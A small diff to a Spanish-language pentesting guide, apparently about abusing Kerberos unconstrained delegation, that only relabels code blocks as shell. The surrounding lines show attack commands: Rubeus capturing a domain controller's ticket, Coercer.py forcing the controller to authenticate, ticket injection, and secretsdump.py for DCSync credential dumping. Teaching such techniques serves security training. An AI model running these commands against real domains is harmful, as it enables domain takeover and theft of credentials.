@@ -46,7 +46,7 @@ Get-DomainComputer -TrustedToAuth
 
 Coaccionar al objetivo (a menudo un DC) a autenticarse al host comprometido:
 
-```
+```sh
 # desde el host con delegación, escuchar y capturar
 Rubeus.exe monitor /interval:5 /filteruser:DC01$
 
@@ -62,7 +62,7 @@ Coercer.py coerce -u user -p pass -t DC01 -l HOST-CON-DELEGACION
 
 Con el TGT del DC capturado, usarlo para DCSync:
 
-```
+```sh
 Rubeus.exe ptt /ticket:TGT_DEL_DC
 secretsdump.py -k -no-pass dominio.local/DC01\$@DC01
 ```
